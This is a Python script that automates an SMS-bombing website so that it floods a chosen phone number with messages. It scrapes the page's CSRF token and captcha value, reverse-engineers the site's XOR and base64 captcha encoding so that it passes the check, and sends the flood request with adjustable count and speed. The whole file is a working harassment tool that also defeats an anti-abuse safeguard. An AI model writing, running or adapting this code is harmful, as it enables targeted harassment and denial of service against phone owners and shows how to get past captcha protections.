import requests
import re
import base64

def reverse_string(s):
    return s[::-1]

def manav_encrypt(text):
    res = ""
    for char in text:
        code = ord(char)
        new_code = code ^ 0x33
        res += chr(new_code)
    
    # btoa(btoa(res))
    b1 = base64.b64encode(res.encode('latin1')).decode('ascii')
    b2 = base64.b64encode(b1.encode('latin1')).decode('ascii')
    
    return reverse_string(b2)

def send_bomb(mobile_no, count=1, country_code="91", speed="fast"):
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    })
    
    # 1. Get the page to fetch the token and captcha
    url = "https://mytoolstown.com/smsbomber/"
    print(f"Fetching {url}...")
    resp = session.get(url)
    
    # Extract Token
    token_match = re.search(r'name="_token" value="([^"]+)"', resp.text)
    if not token_match:
        print("Could not find _token")
        return
    token = token_match.group(1)
    print(f"Token: {token}")
    
    # Extract Captcha
    captcha_match = re.search(r'var captcha = "([^"]+)"', resp.text)
    if not captcha_match:
        print("Could not find captcha")
        return
    captcha = captcha_match.group(1)
    print(f"Captcha Raw: {captcha}")
    
    encrypted_captcha = manav_encrypt(captcha)
    print(f"Captcha Encrypted: {encrypted_captcha}")

    # 2. Send POST request
    # Speed map: fast=1000, medium=2000, slow=3000
    wait_sec = 1000
    if speed == "medium": wait_sec = 2000
    elif speed == "slow": wait_sec = 3000
    
    # Note: The site expects x-www-form-urlencoded or multipart? 
    # $.post sends x-www-form-urlencoded by default.
    
    payload = {
        'country_code': country_code,
        'mobno': mobile_no,
        'count': str(count),
        '_token': token,
        'sent_count': '0',
        'wait_sec': str(wait_sec),
        'captcha': encrypted_captcha
    }
    
    print("Sending POST request...")
    post_resp = session.post(url, data=payload)
    
    print(f"Status Code: {post_resp.status_code}")
    
    # Decrypt Response
    # decryptEncrypted = atob(ReverseString(str))
    try:
        rev = reverse_string(post_resp.text)
        decrypted = base64.b64decode(rev).decode('utf-8')
        print(f"Decrypted Response: {decrypted}")
    except Exception as e:
        print(f"Failed to decrypt response: {e}")
        print(f"Raw Response: {post_resp.text}")

if __name__ == "__main__":
    # Test with a dummy number - USER should change this if they want to really test
    # But for verification of logic, we can check the response.
    # If the logic is correct, it should validly attempt to send.
    send_bomb("9999999999", count=1)
